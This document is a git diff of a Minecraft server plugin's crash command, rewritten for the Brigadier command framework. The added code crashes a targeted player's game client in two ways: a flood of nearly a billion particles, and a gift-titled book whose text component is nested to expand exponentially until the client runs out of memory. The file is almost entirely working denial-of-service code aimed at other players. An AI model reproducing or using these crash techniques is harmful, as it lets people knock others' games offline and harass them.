@@ -1,7 +1,13 @@
 package eu.koolfreedom.command.impl;
 
+import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import eu.koolfreedom.command.annotation.CommandParameters;
 import eu.koolfreedom.command.KoolCommand;
+import io.papermc.paper.command.brigadier.CommandSourceStack;
+import io.papermc.paper.command.brigadier.argument.ArgumentTypes;
+import net.kyori.adventure.inventory.Book;
+import net.kyori.adventure.text.Component;
+import net.kyori.adventure.text.format.NamedTextColor;
 import org.bukkit.Bukkit;
 import org.bukkit.Particle;
 import org.bukkit.command.Command;
@@ -15,57 +21,36 @@ import java.util.List;
 public class CrashCommand extends KoolCommand
 {
     @Override
-    public boolean run(CommandSender sender, Player playerSender, Command cmd, String commandLabel, String[] args)
+    public void build(LiteralArgumentBuilder<CommandSourceStack> root)
     {
-        if (args.length == 0)
-        {
-            msg(sender, "<red>You shouldn't have done that.");
-
-            if (playerSender != null) {
-                crashPlayer(playerSender);
-            } else {
-                msg(sender, "<red>...but since you're console, you get to live.");
-            }
-
-        }
-        else
-        {
-            Player player = Bukkit.getPlayer(args[0]);
-
-            if (player != null)
-            {
-                crashPlayer(player);
-                msg(sender, "<green>Your wish is my command.");
-            }
-            else
-            {
-                if (playerSender == null)
-                {
-                    msg(sender, "<red>We couldn't find that player. Since you're doing this from console, we can't reflect it back at you :(");
-                }
-                else
-                {
-                    msg(sender, "<red>We couldn't find that player, so we're going to do it to you instead :)");
-                    crashPlayer(playerSender);
-                }
-            }
-        }
-
-        return true;
+        root.then(argument("target", ArgumentTypes.player())
+                .then(literal("particles").executes(executes(ctx -> crashParticles(player(ctx, "target")))))
+                .then(literal("jvm_oom").executes(executes(ctx -> crashJVM(player(ctx, "target"), sender(ctx))))));
     }
 
-    @Override
-    public List<String> tabComplete(CommandSender sender, Command command, String commandLabel, String[] args)
+    private void crashParticles(Player target)
     {
-        return args.length == 1 ? Bukkit.getOnlinePlayers().stream().map(Player::getName).toList() : List.of();
+        target.spawnParticle(Particle.ASH, target.getLocation(), 999999999);
+        msg(target, "<green>Your wish is my command.");
     }
 
-    private void crashPlayer(Player victim)
+    private void crashJVM(Player target, CommandSender sender)
     {
-        if (victim == null)
+        target.openBook(Book.builder()
+                .author(Component.text(sender.getName()))
+                .title(Component.text("A loving gift").color(NamedTextColor.LIGHT_PURPLE))
+                .pages(decimatorComponent())
+                .build());
+        msg(sender, "<green>Your wish is my command.");
+    }
+
+    private Component decimatorComponent()
+    {
+        Component c = Component.text("meowmeowmeowmeowmeowmeowmeowmeow");
+        for (int i = 0; i < 20; i++)
         {
-            return; // do nothing
+            c = Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s", c);
         }
-        victim.spawnParticle(Particle.ASH, victim.getLocation(), Integer.MAX_VALUE, 1, 1, 1, 1, null, true);
+        return c;
     }
 }
